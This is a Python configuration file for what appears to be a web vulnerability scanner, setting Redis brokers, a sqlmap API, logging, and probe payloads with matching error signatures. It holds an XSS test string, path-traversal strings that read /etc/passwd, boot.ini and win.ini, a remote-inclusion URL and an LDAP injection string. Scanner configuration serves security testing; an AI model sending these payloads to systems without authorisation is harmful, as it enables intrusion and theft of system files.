# -*- coding: utf-8 -*-
config={
    'redis_broker':'redis://localhost:6379/0',
    'redis_backend':'redis://localhost:6379/0',
    'redis_storage':{
        'host':'127.0.0.1',
        'port':6379,
        'db':1
    },
    'tasks':50,
    'pocs':['xss','lfi','ldap'],
    'poc_path':'/Users/image/PycharmProjects/PScan/lib/pocs/',
    'poc_config':{
      'xss':{
        'xss_str':'<script>alert(1)</script>'
      },
        'lfi':{
            'requests':'''
            ../../../../../../../../../../../../../../../boot.ini
            ../../../../../../../../../../../../../../../boot.ini.html
            C:\boot.ini
            C:\boot.ini
            C:\boot.ini.html
            %SYSTEMROOT%\win.ini
            %SYSTEMROOT%\win.ini
            %SYSTEMROOT%\win.ini.html
            ../../../../../../../../../../../../../../../etc/passwd%00.html
            /etc/passwd%00.html
            ../../../../../../../../../../../../../../../etc/passwd
            ../../../../../../../../../../../../../../../etc/passwd
            ../../../../../../../../../../../../../../../etc/passwd.html
            ....//....//....//....//....//....//....//....//....//....//etc/passwd
            ../../../../../../../../../../../../../../../../etc/passwd%00
            ....//....//....//....//....//....//....//....//....//....//etc/passwd%00
            /etc/passwd
https://raw.githubusercontent.com/code-scan/GourdScan/master/README.md?
            '''.strip().split("\n"),
            'responces':'''
                        java.io.FileNotFoundException\:
            java.lang.Exception\:
            java.lang.IllegalArgumentException\:
            java.net.MalformedURLException\:
            The server encountered an internal error \(.*\) that prevented it from fulfilling this request.
            fread\(\)\:
            for inclusion '\(include_path=
            Failed opening requiredv
            &lt;b&gt;Warning&lt;/b&gt;\:  file\(
            &lt;b&gt;Warning&lt;/b&gt;\:  file_get_contents\(
            root:x\:0\:0\:root\:
            Warning\: fopen\(
            No such file or directory
# GourdScan
            '''.strip().split("\n")
        },
        'ldap':{
            'requests':'''
            ^(%23$!@%23$)(()))******
            '''.strip().split("\n"),
            'responces':'''
                        supplied argument is not a valid ldap
            javax.naming.NameNotFoundException
            LDAPException
            com.sun.jndi.ldap
            Search: Bad search filter
            Protocol error occurred
            Size limit has exceeded
            An inappropriate matching occurred
            A constraint violation occurred
            The syntax is invalid
            Object does not exist
            The alias is invalid
            The distinguished name has an invalid syntax
            The server does not handle directory requests
            There was a naming violation
            There was an object class violation
            Results returned are too large
            Unknown error occurred
            Local error occurred
            The search filter is incorrect
            The search filter is invalid
            The search filter cannot be recognized
            Invalid DN syntax
            No Such Object
            IPWorksASP.LDAP
Module Products.LDAPMultiPlugins
            '''.strip().split("\n")
        }
    },
    'enable_sqlmap':True,
    'sqlmap_api':'http://127.0.0.1:8775',
    'sqlmap':{
      'ban':[]
    },
    'log':{
      "version": 1,
      "disable_existing_loggers": False,

      #  日志格式
      "formatters": {
        "simple": {
          "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
        }
      },

      "handlers": {

        #      定义控制台日志的级别和样式
        "console": {
          "class": "logging.StreamHandler",
          "level": "DEBUG",
          "formatter": "simple",
          "stream": "ext://sys.stdout"
        },

        #        定义INFO（以上）级别的日志处理器
        "info_file_handler": {
          "class": "logging.handlers.RotatingFileHandler",
          "level": "INFO",
          "formatter": "simple",
          "filename": "./logs/info.log",
          "maxBytes": 10485760,
          "backupCount": 20,
          "encoding": "utf8"
        },

        #        定义ERROR以上）级别的日志处理器
        "error_file_handler": {
          "class": "logging.handlers.RotatingFileHandler",
          "level": "ERROR",
          "formatter": "simple",
          "filename": "./logs/errors.log",
          "maxBytes": 10485760,
          "backupCount": 20,
          "encoding": "utf8"
        }
      },

      #    定义不同name的logger的日志配置
      "loggers": {
        "mymodule": {
          "level": "ERROR",
          "handlers": [
            "info_file_handler"
          ],
          "propagate": "no"
        }
      },

      #   定义全局日志配置
      "root": {
        "level": "DEBUG",
        "handlers": [
          "console",
          "info_file_handler",
          "error_file_handler"
        ]
      }
    }


}